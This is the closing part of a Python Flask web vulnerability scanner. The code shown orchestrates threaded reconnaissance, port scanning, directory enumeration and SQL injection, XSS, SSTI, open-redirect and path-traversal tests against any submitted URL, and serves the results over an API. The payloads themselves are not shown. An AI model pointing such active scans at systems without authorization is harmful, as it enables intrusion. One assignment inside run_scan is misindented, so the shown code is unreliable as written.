    add_log(scan_id, 'INFO', "Clickjacking test completed")


# ============================================================
# MAIN SCAN FUNCTION
# ============================================================

def run_scan(scan_id, target_url, scan_types):
    """Main scan orchestration function"""
    
    # Initialize scan
    active_scans[scan_id] = {
        'status': 'running',
        'progress': 0,
        'target': target_url,
        'started_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
scan_results[scan_id] = {
        'vulnerabilities': [],
        'stats': {'total': 0, 'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    }
    
    stop_flag = threading.Event()
    active_scans[scan_id]['stop_flag'] = stop_flag
    
    add_log(scan_id, 'SUCCESS', f"🚀 Scan started for target: {target_url}")
    add_log(scan_id, 'INFO', f"Selected scan types: {', '.join(scan_types)}")
    
    # Phase 1: Reconnaissance
    add_log(scan_id, 'INFO', "╔══════════════════════════════════════╗")
    add_log(scan_id, 'INFO', "║     PHASE 1: RECONNAISSANCE         ║")
    add_log(scan_id, 'INFO', "╚══════════════════════════════════════╝")
    
    try:
        # Check if target is alive
        response = is_alive(target_url)
        if not response:
            add_log(scan_id, 'ERROR', f"Target {target_url} is not reachable!")
            active_scans[scan_id]['status'] = 'failed'
            active_scans[scan_id]['error'] = 'Target not reachable'
            return
        
        target_ip = socket.gethostbyname(urllib.parse.urlparse(target_url).hostname)
        add_log(scan_id, 'SUCCESS', f"Target is alive! IP: {target_ip}")
        active_scans[scan_id]['progress'] = 5
        
        # Phase 2: Information Gathering
        add_log(scan_id, 'INFO', "╔══════════════════════════════════════╗")
        add_log(scan_id, 'INFO', "║     PHASE 2: INFORMATION GATHERING  ║")
        add_log(scan_id, 'INFO', "╚══════════════════════════════════════╝")
        
        threads = []
        
        if 'tech' in scan_types:
            t = threading.Thread(target=check_tech_info, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'headers' in scan_types:
            t = threading.Thread(target=test_security_headers, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'cors' in scan_types:
            t = threading.Thread(target=test_cors, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'ssl' in scan_types:
            t = threading.Thread(target=check_ssl_tls, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'clickjack' in scan_types:
            t = threading.Thread(target=check_clickjacking, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        active_scans[scan_id]['progress'] = 25
        
        # Phase 3: Active Scanning
        add_log(scan_id, 'INFO', "╔══════════════════════════════════════╗")
        add_log(scan_id, 'INFO', "║     PHASE 3: ACTIVE SCANNING        ║")
        add_log(scan_id, 'INFO', "╚══════════════════════════════════════╝")
        
        threads = []
        
        if 'dir' in scan_types:
            t = threading.Thread(target=check_directory_enum, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'port' in scan_types:
            t = threading.Thread(target=port_scan, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        active_scans[scan_id]['progress'] = 50
        
        # Phase 4: Vulnerability Testing
        add_log(scan_id, 'INFO', "╔══════════════════════════════════════╗")
        add_log(scan_id, 'INFO', "║     PHASE 4: VULNERABILITY TESTING  ║")
        add_log(scan_id, 'INFO', "╚══════════════════════════════════════╝")
        
        threads = []
        
        if 'sqli' in scan_types:
            t = threading.Thread(target=test_sql_injection, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'xss' in scan_types:
            t = threading.Thread(target=test_xss, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'ssti' in scan_types:
            t = threading.Thread(target=test_ssti, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'redirect' in scan_types:
            t = threading.Thread(target=test_open_redirect, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        if 'lfi' in scan_types:
            t = threading.Thread(target=test_path_traversal, args=(scan_id, target_url, stop_flag))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        active_scans[scan_id]['progress'] = 100
        
        # Generate summary
        stats = scan_results[scan_id]['stats']
        add_log(scan_id, 'SUCCESS', "╔══════════════════════════════════════╗")
        add_log(scan_id, 'SUCCESS', "║     SCAN COMPLETED!                  ║")
        add_log(scan_id, 'SUCCESS', "╚══════════════════════════════════════╝")
        add_log(scan_id, 'SUCCESS', f"Total vulnerabilities found: {stats['total']}")
        add_log(scan_id, 'SUCCESS', f"  CRITICAL: {stats['critical']}")
        add_log(scan_id, 'SUCCESS', f"  HIGH:     {stats['high']}")
        add_log(scan_id, 'SUCCESS', f"  MEDIUM:   {stats['medium']}")
        add_log(scan_id, 'SUCCESS', f"  LOW:      {stats['low']}")
        add_log(scan_id, 'SUCCESS', f"  INFO:     {stats['info']}")
        
        active_scans[scan_id]['status'] = 'completed'
        
    except Exception as e:
        add_log(scan_id, 'ERROR', f"Scan failed: {str(e)}")
        active_scans[scan_id]['status'] = 'failed'
        active_scans[scan_id]['error'] = str(e)


# ============================================================
# FLASK ROUTES - API
# ============================================================

@app.route('/')
def index():
    return app.send_static_file('index.html')


@app.route('/api/scan', methods=['POST'])
def start_scan():
    """Start a new scan"""
    data = request.get_json()
    
    if not data or 'url' not in data:
        return jsonify({'error': 'URL is required'}), 400
    
    target_url = data['url'].strip()
    scan_types = data.get('scan_types', ['sqli', 'xss', 'headers', 'dir', 'port', 'ssl', 'cors', 'ssti', 'lfi', 'redirect', 'clickjack', 'tech'])
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    try:
        parsed = urllib.parse.urlparse(target_url)
        if not parsed.hostname:
            return jsonify({'error': 'Invalid URL'}), 400
    except:
        return jsonify({'error': 'Invalid URL format'}), 400
    
    # Create scan ID
    scan_id = hashlib.md5(f"{target_url}{time.time()}{os.urandom(8).hex()}".encode()).hexdigest()[:12]
    
    # Start scan in background thread
    scan_thread = threading.Thread(target=run_scan, args=(scan_id, target_url, scan_types))
    scan_thread.daemon = True
    scan_thread.start()
    
    return jsonify({
        'scan_id': scan_id,
        'target': target_url,
        'message': 'Scan started successfully'
    })


@app.route('/api/scan/<scan_id>/status')
def get_scan_status(scan_id):
    """Get scan status"""
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    
    scan_info = active_scans[scan_id]
    stats = scan_results.get(scan_id, {}).get('stats', {})
    
    return jsonify({
        'scan_id': scan_id,
        'status': scan_info.get('status', 'unknown'),
        'progress': scan_info.get('progress', 0),
        'target': scan_info.get('target', ''),
        'started_at': scan_info.get('started_at', ''),
        'error': scan_info.get('error'),
        'stats': stats
    })


@app.route('/api/scan/<scan_id>/results')
def get_scan_results(scan_id):
    """Get scan results"""
    if scan_id not in scan_results:
        return jsonify({'error': 'No results found', 'vulnerabilities': [], 'stats': {}})
    
    results = scan_results[scan_id]
    return jsonify(results)


@app.route('/api/scan/<scan_id>/logs')
def get_scan_logs(scan_id):
    """Get scan logs"""
    logs = scan_logs.get(scan_id, [])
    return jsonify({'logs': logs})


@app.route('/api/scan/<scan_id>/stop', methods=['POST'])
def stop_scan(scan_id):
    """Stop a running scan"""
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    
    stop_flag = active_scans[scan_id].get('stop_flag')
    if stop_flag:
        stop_flag.set()
        add_log(scan_id, 'WARN', '⚠️ Scan stopped by user')
    
    active_scans[scan_id]['status'] = 'stopped'
    
    return jsonify({'message': 'Scan stopped'})


@app.route('/api/report/<scan_id>')
def get_report(scan_id):
    """Generate a formatted report"""
    if scan_id not in scan_results:
        return jsonify({'error': 'No results'}), 404
    
    results = scan_results[scan_id]
    scan_info = active_scans.get(scan_id, {})
    
    report = {
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'target': scan_info.get('target', ''),
        'scan_id': scan_id,
        'duration': scan_info.get('started_at', ''),
        'stats': results['stats'],
        'vulnerabilities': results['vulnerabilities'],
        'summary': f"Found {results['stats']['total']} vulnerabilities "
                   f"({results['stats']['critical']} critical, "
                   f"{results['stats']['high']} high, "
                   f"{results['stats']['medium']} medium, "
                   f"{results['stats']['low']} low, "
                   f"{results['stats']['info']} informational)"
    }
    
    return jsonify(report)


@app.route('/api/scans/active')
def get_active_scans():
    """Get list of active scans"""
    active = []
    for scan_id, info in active_scans.items():
        if info['status'] in ['running', 'queued']:
            active.append({
                'scan_id': scan_id,
                'target': info['target'],
                'status': info['status'],
                'progress': info['progress']
            })
    return jsonify({'active_scans': active})


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════╗
║              VULNERABILITY SCANNER ENGINE                    ║
║                   Ethical Hacking Tool                       ║
║                                                              ║
║          [!] For authorized testing only                     ║
╚══════════════════════════════════════════════════════════════╝
    """)
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug)
